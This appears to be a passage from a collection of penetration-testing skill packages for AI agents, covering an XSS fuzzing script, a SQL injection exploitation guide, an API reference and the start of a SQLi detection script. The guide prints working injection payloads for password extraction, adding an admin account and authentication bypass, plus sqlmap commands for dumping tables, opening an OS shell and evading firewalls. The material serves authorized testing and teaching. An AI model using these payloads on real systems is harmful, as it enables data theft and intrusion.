@@ -1,0 +1,1110 @@
+[PART 7/14]
+-----
+        resp = requests.get(full_url, headers=headers, timeout=10, verify=False)
+        unencoded = [ch for ch in test_string if ch in resp.text]
+        return unencoded
+    except requests.RequestException:
+        return []
+
+
+def fuzz_xss_payloads(base_url, param_url, param_name, token=None, payloads=None):
+    """Fuzz a parameter with XSS payloads and check for reflection."""
+    if payloads is None:
+        payloads = XSS_WORDLIST
+    headers = {"Authorization": f"Bearer {token}"} if token else {}
+    findings = []
+    for payload in payloads:
+        url = f"{urljoin(base_url, param_url)}?{param_name}={quote(payload)}"
+        try:
+            resp = requests.get(url, headers=headers, timeout=10, verify=False)
+            if payload in resp.text:
+                findings.append({
+                    "type": "REFLECTED_XSS", "url": param_url, "param": param_name,
+                    "payload": payload, "severity": "HIGH",
+                })
+                print(f"  [!] REFLECTED: {param_name}={payload[:40]}...")
+                break
+        except requests.RequestException:
+            continue
+    return findings
+
+
+def test_stored_xss_endpoints(base_url, endpoints, token):
+    """Test stored XSS via common input endpoints."""
+    print("\n[*] Testing stored XSS endpoints...")
+    findings = []
+    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
+    test_payloads = XSS_WORDLIST[:3]
+
+    for ep in endpoints:
+        url = urljoin(base_url, ep["submit"])
+        for payload in test_payloads:
+            try:
+                data = {ep.get("field", "body"): payload}
+                resp = requests.post(url, headers=headers, json=data, timeout=10, verify=False)
+                if resp.status_code in (200, 201):
+                    display_url = urljoin(base_url, ep["display"])
+                    display_resp = requests.get(display_url, headers=headers, timeout=10, verify=False)
+                    if payload in display_resp.text:
+                        findings.append({
+                            "type": "STORED_XSS", "submit": ep["submit"],
+                            "display": ep["display"], "field": ep.get("field", "body"),
+                            "payload": payload, "severity": "CRITICAL",
+                        })
+                        print(f"  [!] STORED XSS: {ep['submit']} -> {ep['display']}")
+                        break
+            except requests.RequestException:
+                continue
+    return findings
+
+
+def analyze_csp(base_url):
+    """Analyze CSP header for XSS bypass opportunities."""
+    print("\n[*] Analyzing CSP for bypass opportunities...")
+    findings = []
+    try:
+        resp = requests.get(base_url, timeout=10, verify=False)
+        csp = resp.headers.get("Content-Security-Policy", "")
+        if not csp:
+            findings.append({"type": "NO_CSP", "detail": "No CSP header present", "severity": "MEDIUM"})
+            print("  [!] No CSP header - inline scripts will execute")
+            return findings
+
+        directives = {}
+        for part in csp.split(";"):
+            part = part.strip()
+            if " " in part:
+                key, value = part.split(" ", 1)
+                directives[key] = value
+
+        script_src = directives.get("script-src", directives.get("default-src", ""))
+        weaknesses = []
+        if "'unsafe-inline'" in script_src:
+            weaknesses.append("unsafe-inline allows inline scripts")
+        if "'unsafe-eval'" in script_src:
+            weaknesses.append("unsafe-eval allows eval()")
+        if "data:" in script_src:
+            weaknesses.append("data: URIs allowed in script-src")
+        wildcard_domains = re.findall(r'\*\.\S+', script_src)
+        if wildcard_domains:
+            weaknesses.append(f"Wildcard domains: {wildcard_domains}")
+
+        for w in weaknesses:
+            findings.append({"type": "CSP_WEAKNESS", "detail": w, "severity": "HIGH"})
+            print(f"  [!] CSP weakness: {w}")
+        if not weaknesses:
+            print(f"  [+] CSP appears well-configured")
+    except requests.RequestException:
+        pass
+    return findings
+
+
+def generate_report(findings, output_path):
+    """Generate XSS assessment report."""
+    report = {
+        "assessment_date": datetime.now().isoformat(),
+        "total_findings": len(findings),
+        "by_severity": {},
+        "findings": findings,
+    }
+    for f in findings:
+        s = f.get("severity", "INFO")
+        report["by_severity"][s] = report["by_severity"].get(s, 0) + 1
+    with open(output_path, "w") as fh:
+        json.dump(report, fh, indent=2)
+    print(f"\n[*] Report: {output_path} | Findings: {len(findings)}")
+
+
+def main():
+    parser = argparse.ArgumentParser(description="XSS Testing Agent (Burp Suite Companion)")
+    parser.add_argument("base_url", help="Base URL of the target")
+    parser.add_argument("--token", help="Bearer token for authentication")
+    parser.add_argument("--params", nargs="+", help="URL?param pairs to test")
+    parser.add_argument("-o", "--output", default="xss_burp_report.json")
+    args = parser.parse_args()
+
+    print(f"[*] XSS Testing (Burp Suite Companion): {args.base_url}")
+    findings = []
+    findings.extend(analyze_csp(args.base_url))
+    reflections = find_reflection_points(args.base_url, args.token)
+    for ref in reflections[:15]:
+        unencoded = test_character_encoding(
+            urljoin(args.base_url, ref["url"]), ref["param"], args.token)
+        if "<" in unencoded or '"' in unencoded:
+            findings.extend(fuzz_xss_payloads(
+                args.base_url, ref["url"], ref["param"], args.token))
+    generate_report(findings, args.output)
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: exploiting-sql-injection-vulnerabilities/SKILL.md #####
+---
+name: exploiting-sql-injection-vulnerabilities
+description: 'Identifies and exploits SQL injection vulnerabilities in web applications
+  during authorized penetration tests using manual techniques and automated tools
+  like sqlmap. The tester detects injection points through error-based, union-based,
+  blind boolean, and time-based blind techniques across all major database engines
+  (MySQL, PostgreSQL, MSSQL, Oracle) to demonstrate data extraction, authentication
+  bypass, and potential remote code execution. Activates for requests involving SQL
+  injection testing, SQLi exploitation, database security assessment, or injection
+  vulnerability verification.
+
+  '
+domain: cybersecurity
+subdomain: penetration-testing
+tags:
+- SQL-injection
+- sqlmap
+- database-security
+- OWASP-A03
+- injection-testing
+version: 1.0.0
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- ID.RA-01
+- ID.RA-06
+- GV.OV-02
+- DE.AE-07
+mitre_attack:
+- T1595
+- T1190
+- T1059
+- T1078
+- T1055
+---
+# Exploiting SQL Injection Vulnerabilities
+
+## When to Use
+
+- Testing web application input parameters for SQL injection vulnerabilities during an authorized penetration test
+- Validating that parameterized queries and input sanitization are properly implemented across all database interactions
+- Demonstrating the business impact of a confirmed SQL injection vulnerability by extracting sensitive data
+- Verifying that WAF rules and input validation controls effectively block SQL injection payloads
+- Testing stored procedures, dynamic SQL, and ORM bypass scenarios in enterprise applications
+
+**Do not use** against databases without written authorization, for extracting or exfiltrating actual customer data beyond what is needed for proof of concept, or against production databases where exploitation could corrupt data integrity.
+
+## Prerequisites
+
+- Written authorization specifying the target application and permissible level of exploitation (detection only vs. full exploitation)
+- Burp Suite Professional configured as an intercepting proxy to capture and modify HTTP requests
+- sqlmap installed with current version for automated detection and exploitation
+- Knowledge of the target database engine (MySQL, PostgreSQL, MSSQL, Oracle) or ability to fingerprint it
+- Test accounts at various privilege levels to test injection in authenticated contexts
+
+## Workflow
+
+### Step 1: Injection Point Discovery
+
+Identify parameters that interact with the database:
+
+- **Map all input vectors**: Catalog every parameter in URLs (GET), request bodies (POST), HTTP headers (Cookie, Referer, User-Agent, X-Forwarded-For), and JSON/XML API payloads
+- **Error-based detection**: Inject a single quote (`'`) into each parameter and observe the response. SQL errors (e.g., "You have an error in your SQL syntax", "unterminated quoted string", "ORA-01756") confirm the parameter reaches the database unsanitized.
+- **Boolean-based detection**: Inject `' AND 1=1--` (true condition) and `' AND 1=2--` (false condition). If the responses differ (different content length, different data returned, different HTTP status), the parameter is injectable.
+- **Time-based detection**: Inject `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND SLEEP(5)--` (MySQL), or `'; SELECT pg_sleep(5)--` (PostgreSQL). A 5-second response delay confirms injection.
+- **Out-of-band detection**: Use payloads that trigger DNS or HTTP requests to a Burp Collaborator domain to confirm injection in scenarios where responses are not directly observable.
+- **Second-order injection**: Test for injection where input is stored and later used in a different SQL query (e.g., username stored at registration, used in a query on the profile page).
+
+### Step 2: Database Fingerprinting
+
+Determine the database engine and version to select appropriate exploitation techniques:
+
+- **Error-based fingerprinting**: Each database produces distinctive error messages. MySQL includes "MySQL", MSSQL mentions "SQL Server", PostgreSQL references "PG", Oracle contains "ORA-".
+- **Function-based fingerprinting**: Inject database-specific functions:
+  - MySQL: `' AND VERSION()--` or `' AND @@version--`
+  - MSSQL: `' AND @@version--` or `' AND DB_NAME()--`
+  - PostgreSQL: `' AND version()--`
+  - Oracle: `' AND banner FROM v$version--`
+- **String concatenation differences**: MySQL uses `CONCAT('a','b')` or `'a' 'b'`, MSSQL uses `'a'+'b'`, PostgreSQL uses `'a'||'b'`, Oracle uses `'a'||'b'`
+- **Comment syntax**: MySQL supports `#` and `-- `, MSSQL uses `-- `, PostgreSQL uses `-- `, Oracle uses `-- `
+
+### Step 3: Manual Exploitation Techniques
+
+Exploit confirmed injection points using technique-appropriate methods:
+
+- **UNION-based extraction**: Determine the number of columns with `ORDER BY` incrementing (`' ORDER BY 1--`, `' ORDER BY 2--`, etc. until an error occurs). Then construct UNION SELECT to extract data:
+  ```
+  ' UNION SELECT NULL,username,password,NULL FROM users--
+  ```
+- **Error-based extraction** (MySQL): Use `EXTRACTVALUE` or `UPDATEXML` to force data into error messages:
+  ```
+  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+  ```
+- **Blind boolean extraction**: Extract data one character at a time by testing character values:
+  ```
+  ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+  ```
+- **Time-based blind extraction**: Same character-by-character approach using time delays:
+  ```
+  ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
+  ```
+- **Stacked queries** (where supported): Execute additional SQL statements:
+  ```
+  '; INSERT INTO users(username,password,role) VALUES('attacker','password','admin')--
+  ```
+
+### Step 4: Automated Exploitation with sqlmap
+
+Use sqlmap for efficient exploitation of confirmed injection points:
+
+- **Basic detection**: `sqlmap -u "https://target.com/page?id=1" --batch --random-agent` to detect injection and identify the database
+- **Extract databases**: `sqlmap -u "https://target.com/page?id=1" --dbs` to list all databases
+- **Extract tables**: `sqlmap -u "https://target.com/page?id=1" -D <database> --tables` to list tables
+- **Extract data**: `sqlmap -u "https://target.com/page?id=1" -D <database> -T users --dump --threads 5` to extract table contents
+- **POST parameters**: `sqlmap -u "https://target.com/login" --data="username=test&password=test" -p username` to test POST parameters
+- **Cookie injection**: `sqlmap -u "https://target.com/page" --cookie="session=abc123; id=1*" --level 2` to test cookie parameters (mark injectable parameter with *)
+- **OS command execution** (if DB user has sufficient privileges): `sqlmap -u "https://target.com/page?id=1" --os-shell` to attempt command execution via xp_cmdshell (MSSQL) or INTO OUTFILE (MySQL)
+- **Tamper scripts**: `sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between` to bypass WAF filters
+
+### Step 5: Impact Demonstration and Reporting
+
+Document the full impact of the SQL injection vulnerability:
+
+- **Data extraction evidence**: Capture screenshots or sqlmap output showing extracted database names, table schemas, and sample records (redact actual PII in the report)
+- **Authentication bypass**: Demonstrate login bypass with `admin' OR 1=1--` and document the bypassed authentication mechanism
+- **Privilege escalation**: If the database user has DBA privileges, document what additional capabilities are available (file read/write, command execution)
+- **Lateral movement potential**: Document if the database server has network access to other internal systems that could be reached through OS-level access gained via SQLi
+- **Remediation**: Provide specific code-level fixes showing the vulnerable query and the corrected parameterized version
+
+## Key Concepts
+
+| Term | Definition |
+|------|------------|
+| **SQL Injection** | A code injection technique that exploits unvalidated user input in SQL queries to manipulate database operations, extract data, or execute administrative operations |
+| **Union-Based SQLi** | Injection technique that appends a UNION SELECT statement to the original query to extract data from other tables in the same response |
+| **Blind SQL Injection** | Injection where the application does not return query results directly; the attacker infers data through boolean responses or time delays |
+| **Parameterized Query** | A prepared SQL statement where user input is passed as parameters rather than concatenated into the query string, preventing injection |
+| **Second-Order Injection** | SQL injection where the malicious payload is stored by the application and executed in a different context or SQL query at a later time |
+| **Stacked Queries** | Executing multiple SQL statements separated by semicolons in a single request, enabling INSERT, UPDATE, or DELETE operations through injection |
+| **WAF Bypass** | Techniques for evading Web Application Firewall rules that block common SQL injection patterns, using encoding, alternate syntax, or fragmentation |
+
+## Tools & Systems
+
+- **sqlmap**: Automated SQL injection detection and exploitation tool supporting 6 injection techniques across 30+ database management systems
+- **Burp Suite Professional**: HTTP proxy for intercepting, modifying, and replaying requests with SQL injection payloads across all parameter types
+- **Havij**: GUI-based SQL injection tool used for rapid automated exploitation when sqlmap is not available
+- **jSQL Injection**: Java-based SQL injection tool with GUI supporting automatic injection, database extraction, and file read/write
+
+## Common Scenarios
+
+### Scenario: SQL Injection in Healthcare Patient Portal
+
+**Context**: A healthcare organization's patient portal allows patients to view their medical records, appointments, and billing information. The application uses a PHP backend with MySQL database. The tester has a valid patient account.
+
+**Approach**:
+1. Map all parameters in the patient portal; identify that the appointment detail page uses `/appointment?id=4521`
+2. Inject a single quote into the id parameter; receive a MySQL error confirming the parameter is injectable
+3. Use `ORDER BY` to determine the query returns 7 columns
+4. Construct UNION SELECT to extract table names from information_schema, discovering tables: patients, medical_records, billing, admin_users
+5. Extract admin_users table to reveal 5 administrator accounts with MD5-hashed passwords
+6. Demonstrate that patient medical records for all patients are accessible by querying the medical_records table through the injection point
+7. Document that 15,000+ patient records containing PHI (protected health information) are accessible, constituting a HIPAA violation
+
+**Pitfalls**:
+- Running sqlmap with default settings against a production database and causing excessive load or data corruption
+- Extracting and storing actual patient data during the assessment rather than limiting proof to record counts and schema
+- Not testing for second-order injection in stored procedures called by the application
+- Failing to test all parameter types (cookies, headers, JSON body) and only testing URL parameters
+
+## Output Format
+
+```
+## Finding: SQL Injection in Appointment Detail Parameter
+
+**ID**: SQLI-001
+**Severity**: Critical (CVSS 9.8)
+**Affected URL**: GET /appointment?id=4521
+**Parameter**: id (GET parameter)
+**Database**: MySQL 8.0.32
+**Injection Type**: Error-based, UNION-based
+
+**Description**:
+The appointment detail page concatenates the 'id' URL parameter directly into
+a SQL query without parameterization or input validation. This allows an attacker
+to inject arbitrary SQL statements and extract data from any table in the database.
+
+**Proof of Concept**:
+Request: GET /appointment?id=4521' UNION SELECT 1,username,password,4,5,6,7 FROM admin_users-- -
+Response: Returns admin usernames and MD5 password hashes in the page content.
+
+**Data Accessible**:
+- patients table: 15,247 records (name, DOB, SSN, address, phone)
+- medical_records table: 43,891 records (diagnoses, prescriptions, lab results)
+- admin_users table: 5 accounts with MD5-hashed passwords
+- billing table: 28,563 records (insurance details, payment information)
+
+**Remediation**:
+1. Replace string concatenation with parameterized queries:
+   VULNERABLE:  $query = "SELECT * FROM appointments WHERE id = " . $_GET['id'];
+   SECURE:      $stmt = $pdo->prepare("SELECT * FROM appointments WHERE id = ?");
+                $stmt->execute([$_GET['id']]);
+2. Implement input validation to reject non-integer values for the id parameter
+3. Apply least-privilege database permissions (read-only for the web application user)
+4. Deploy a WAF rule to detect and block SQL injection patterns as defense-in-depth
+```
+
+##### END FILE #####
+
+##### FILE: exploiting-sql-injection-vulnerabilities/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: exploiting-sql-injection-vulnerabilities/references/api-reference.md #####
+# API Reference: SQL Injection Detection Agent
+
+## Dependencies
+
+| Library | Version | Purpose |
+|---------|---------|---------|
+| requests | >=2.28 | HTTP client for injection payload delivery |
+
+## CLI Usage
+
+```bash
+python scripts/agent.py \
+  --url "https://target.example.com/products" \
+  --param id --method GET \
+  --output sqli_report.json
+```
+
+## Functions
+
+### `detect_error_based(url, param, method, headers) -> dict`
+Injects `'` and matches response against SQL error patterns for MySQL, PostgreSQL, MSSQL, Oracle, SQLite.
+
+### `detect_boolean_based(url, param, method, headers) -> dict`
+Compares response lengths for `AND 1=1` (true) vs `AND 1=2` (false) against a baseline.
+
+### `detect_time_based(url, param, method, headers, delay) -> dict`
+Tests `SLEEP()`, `pg_sleep()`, and `WAITFOR DELAY` payloads. Measures response time against target delay.
+
+### `detect_union_columns(url, param, method, headers, max_cols) -> dict`
+Increments `ORDER BY N` until error to determine column count for UNION injection.
+
+### `fingerprint_database(url, param, method, headers) -> dict`
+Tries `@@version` and `version()` via UNION SELECT to identify the database engine.
+
+### `run_assessment(url, param, method) -> dict`
+Runs all detection techniques and compiles findings.
+
+## SQL Error Signatures
+
+| Database | Pattern |
+|----------|---------|
+| MySQL | `SQL syntax.*MySQL`, `Warning.*mysql_` |
+| PostgreSQL | `ERROR:\s+syntax error`, `PSQLException` |
+| MSSQL | `SQL Server.*Driver`, `SQLServerException` |
+| Oracle | `ORA-\d{5}` |
+| SQLite | `SQLite\.Exception` |
+
+## Output Schema
+
+```json
+{
+  "target": "https://target.example.com/products",
+  "parameter": "id",
+  "injectable": true,
+  "error_based": {"injectable": true, "database": "mysql"},
+  "boolean_based": {"injectable": true},
+  "time_based": {"injectable": false},
+  "findings": ["CRITICAL: Error-based SQLi confirmed (DB: mysql)"]
+}
+```
+
+##### END FILE #####
+
+##### FILE: exploiting-sql-injection-vulnerabilities/scripts/agent.py #####
+#!/usr/bin/env python3
+# For authorized testing in lab/CTF environments only
+"""SQL injection detection agent using requests for manual technique-based testing."""
+
+import argparse
+import json
+import logging
+import sys
+import time
+import re
+from typing import Optional
+
+try:
+    import requests
+except ImportError:
+    sys.exit("requests is required: pip install requests")
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logger = logging.getLogger(__name__)
+
+SQL_ERRORS = {
+    "mysql": [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException"],
+    "postgresql": [r"ERROR:\s+syntax error", r"pg_query\(\)", r"PSQLException"],
+    "mssql": [r"SQL Server.*Driver", r"OLE DB.*SQL Server", r"SQLServerException"],
+    "oracle": [r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated"],
+    "sqlite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite"],
+}
+
+
+def detect_error_based(url: str, param: str, method: str = "GET",
+                        headers: Optional[dict] = None) -> dict:
+    """Inject a single quote to detect SQL errors in the response."""
+    payload = "'"
+    test_url, data = _build_request(url, param, payload, method)
+    resp = _send(test_url, method, data, headers)
+
+    db_type = None
+    error_found = False
+    for db, patterns in SQL_ERRORS.items():
+        for pattern in patterns:
+            if re.search(pattern, resp.text, re.IGNORECASE):
+                db_type = db
+                error_found = True
+                break
+        if error_found:
+            break
+
+    return {
+        "technique": "error_based",
+        "parameter": param,
+        "injectable": error_found,
+        "database": db_type,
+        "status_code": resp.status_code,
+    }
+
+
+def detect_boolean_based(url: str, param: str, method: str = "GET",
+                          headers: Optional[dict] = None) -> dict:
+    """Test boolean-based blind SQLi with true/false conditions."""
+    baseline_resp = _send(*_build_request(url, param, "1", method), headers)
+    true_resp = _send(*_build_request(url, param, "1 AND 1=1--", method), headers)
+    false_resp = _send(*_build_request(url, param, "1 AND 1=2--", method), headers)
+
+    true_match = len(true_resp.content) == len(baseline_resp.content)
+    false_diff = abs(len(false_resp.content) - len(baseline_resp.content)) > 10
+
+    return {
+        "technique": "boolean_based",
+        "parameter": param,
+        "injectable": true_match and false_diff,
+        "baseline_length": len(baseline_resp.content),
+        "true_length": len(true_resp.content),
+        "false_length": len(false_resp.content),
+    }
+
+
+def detect_time_based(url: str, param: str, method: str = "GET",
+                       headers: Optional[dict] = None, delay: int = 5) -> dict:
+    """Test time-based blind SQLi with sleep functions."""
+    payloads = {
+        "mysql": f"1 AND SLEEP({delay})--",
+        "postgresql": f"1; SELECT pg_sleep({delay})--",
+        "mssql": f"1; WAITFOR DELAY '0:0:{delay}'--",
+    }
+    results = {}
+    for db, payload in payloads.items():
+        start = time.time()
+        _send(*_build_request(url, param, payload, method), headers)
+        elapsed = time.time() - start
+        results[db] = {"elapsed": round(elapsed, 2), "delayed": elapsed >= delay - 1}
+
+    injectable = any(r["delayed"] for r in results.values())
+    detected_db = next((db for db, r in results.items() if r["delayed"]), None)
+
+    return {
+        "technique": "time_based",
+        "parameter": param,
+        "injectable": injectable,
+        "database": detected_db,
+        "delay_target": delay,
+        "timing_results": results,
+    }
+
+
+def detect_union_columns(url: str, param: str, method: str = "GET",
+                          headers: Optional[dict] = None, max_cols: int = 20) -> dict:
+    """Determine the number of columns for UNION-based injection."""
+    for n in range(1, max_cols + 1):
+        payload = f"1 ORDER BY {n}--"
+        resp = _send(*_build_request(url, param, payload, method), headers)
+        if resp.status_code >= 400 or "error" in resp.text.lower():
+            return {"technique": "union_column_count", "parameter": param, "columns": n - 1}
+
+    return {"technique": "union_column_count", "parameter": param, "columns": None}
+
+
+def fingerprint_database(url: str, param: str, method: str = "GET",
+                          headers: Optional[dict] = None) -> dict:
+    """Identify the database engine using version functions."""
+    version_payloads = {
+        "mysql": "1 UNION SELECT @@version,NULL--",
+        "postgresql": "1 UNION SELECT version(),NULL--",
+        "mssql": "1 UNION SELECT @@version,NULL--",
+    }
+    for db, payload in version_payloads.items():
+        resp = _send(*_build_request(url, param, payload, method), headers)
+        if resp.status_code == 200 and len(resp.content) > 50:
+            return {"database": db, "response_preview": resp.text[:200]}
+
+    return {"database": "unknown"}
+
+
+def _build_request(url: str, param: str, value: str, method: str):
+    if method.upper() == "GET":
+        separator = "&" if "?" in url else "?"
+        return f"{url}{separator}{param}={requests.utils.quote(value)}", None
+    else:
+        return url, {param: value}
+
+
+def _send(url: str, method: str = "GET", data: Optional[dict] = None,
+           headers: Optional[dict] = None) -> requests.Response:
+    h = headers or {}
+    try:
+        if method.upper() == "POST":
+            return requests.post(url, data=data, headers=h, timeout=15, verify=False)
+        return requests.get(url, headers=h, timeout=15, verify=False)
+    except requests.RequestException:
+        return type("FakeResp", (), {"status_code": 0, "text": "", "content": b""})()
+
+
+def run_assessment(url: str, param: str, method: str = "GET") -> dict:
+    """Run complete SQL injection assessment."""
+    error = detect_error_based(url, param, method)
+    boolean = detect_boolean_based(url, param, method)
+    timing = detect_time_based(url, param, method)
+    columns = detect_union_columns(url, param, method) if error["injectable"] else {}
+
+    injectable = error["injectable"] or boolean["injectable"] or timing["injectable"]
+    findings = []
+    if error["injectable"]:
+        findings.append(f"CRITICAL: Error-based SQLi confirmed (DB: {error['database']})")
+    if boolean["injectable"]:
+        findings.append("CRITICAL: Boolean-based blind SQLi confirmed")
+    if timing["injectable"]:
+        findings.append(f"CRITICAL: Time-based blind SQLi confirmed (DB: {timing['database']})")
+
+    return {
+        "target": url,
+        "parameter": param,
+        "injectable": injectable,
+        "error_based": error,
+        "boolean_based": boolean,
+        "time_based": timing,
+        "union_columns": columns,
+        "findings": findings,
+    }
+
+
+def main():
+    parser = argparse.ArgumentParser(description="SQL Injection Detection Agent")
+    parser.add_argument("--url", required=True, help="Target URL")
+    parser.add_argument("--param", required=True, help="Parameter to test")
+    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
